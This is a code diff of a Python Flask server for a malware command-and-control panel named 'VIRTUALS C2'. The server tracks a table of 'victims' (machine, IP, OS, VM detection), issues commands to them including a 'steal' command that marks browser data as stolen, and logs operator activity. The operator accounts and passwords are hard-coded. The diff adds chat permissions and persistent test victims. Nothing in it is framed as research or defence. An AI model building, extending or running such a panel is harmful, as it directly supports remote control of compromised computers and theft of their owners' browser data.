-        return jsonify({'success': True, 'role': row[1]})
+        session['can_chat'] = bool(row[2])
+        return jsonify({'success': True, 'role': row[1], 'can_chat': bool(row[2])})
     conn.close()
     return jsonify({'success': False})
 
@@ -609,7 +656,6 @@ def get_owner_data():
     conn = get_db()
     c = conn.cursor()
     
-    # Active users (logged in within last 5 minutes)
     cutoff = (datetime.datetime.now() - datetime.timedelta(minutes=5)).strftime("%Y-%m-%d %H:%M:%S")
     c.execute("SELECT username, last_ip, role, current_activity FROM users WHERE last_login > ? ORDER BY last_login DESC", (cutoff,))
     active = c.fetchall()
@@ -622,11 +668,9 @@ def get_owner_data():
             'activity': row[3] if row[3] else 'idle'
         })
     
-    # Login logs (last 15)
     c.execute("SELECT username, ip, timestamp FROM login_logs ORDER BY timestamp DESC LIMIT 15")
     logs = [{'username': row[0], 'ip': row[1], 'time': row[2]} for row in c.fetchall()]
     
-    # Command stats with last command
     c.execute("SELECT user, COUNT(*), MAX(timestamp) FROM commands GROUP BY user ORDER BY COUNT(*) DESC")
     stats = []
     for row in c.fetchall():
@@ -709,7 +753,7 @@ def api():
     if action == 'getVictims':
         conn = get_db()
         c = conn.cursor()
-        c.execute("SELECT * FROM victims ORDER BY last_seen DESC")
+        c.execute("SELECT * FROM victims ORDER BY is_test DESC, last_seen DESC")
         victims = {}
         for row in c.fetchall():
             victims[row[0]] = {'id': row[0], 'pc': row[1], 'ip': row[2], 'os': row[3],
@@ -748,7 +792,6 @@ def api():
         vid = data.get('victim_id')
         cmd = data.get('command')
         
-        # Update user activity
         conn = get_db()
         c = conn.cursor()
         c.execute("UPDATE users SET current_activity = ? WHERE username = ?", (f"executing {cmd}", current_user))
@@ -782,7 +825,6 @@ def api():
             c.execute("UPDATE victims SET is_vm = ? WHERE id = ?", (1 if is_vm else 0, vid))
         if cmd == 'steal':
             c.execute("UPDATE victims SET browser_data_stolen = 1 WHERE id = ?", (vid,))
-        # Reset activity after command
         c.execute("UPDATE users SET current_activity = 'idle' WHERE username = ?", (current_user,))
         conn.commit()
         conn.close()
@@ -836,17 +878,17 @@ def heartbeat():
 if __name__ == '__main__':
     print("""
     ╔═══════════════════════════════════════════════════════════════╗
-    ║   VIRTUALS C2 - LIVE OWNER PANEL                           ║
-    ║   Real-time IP Tracking · User Activity · Live Updates     ║
+    ║   VIRTUALS C2 - PERSISTENT VICTIMS                         ║
+    ║   Victims Never Disappear · Full Permissions               ║
+    ║   Jerry & Owner Can Chat · Others View Only               ║
     ╚═══════════════════════════════════════════════════════════════╝
     """)
-    print(f"[*] Server: http://0.0.0.0:{PORT}")
-    print(f"[*] Login: http://0.0.0.0:{PORT}/login")
+    print(f"[*] Server: http://localhost:{PORT}")
+    print(f"[*] Login: http://localhost:{PORT}/login")
     print("\n[*] USERS:")
-    print("    adam    / virtuals2024 (user)")
-    print("    jerry   / virtuals2024 (user)")
-    print("    haunt   / virtuals2024 (user)")
-    print("    owner   / whiteknight (owner) 👑")
-    print("\n[*] OWNER PANEL: Click ◈ icon (top right)")
-    print("[*] Shows: IPs, Online Users, Activity, Command Stats")
+    print("    adam    / virtuals2024 (viewer - can't chat)")
+    print("    jerry   / virtuals2024 (operator - CAN chat) ✨")
+    print("    haunt   / virtuals2024 (viewer - can't chat)")
+    print("    owner   / whiteknight (owner - CAN chat) 👑")
+    print("\n[*] Test victims are PERSISTENT and never disappear!")
     app.run(host='0.0.0.0', port=PORT, debug=False)
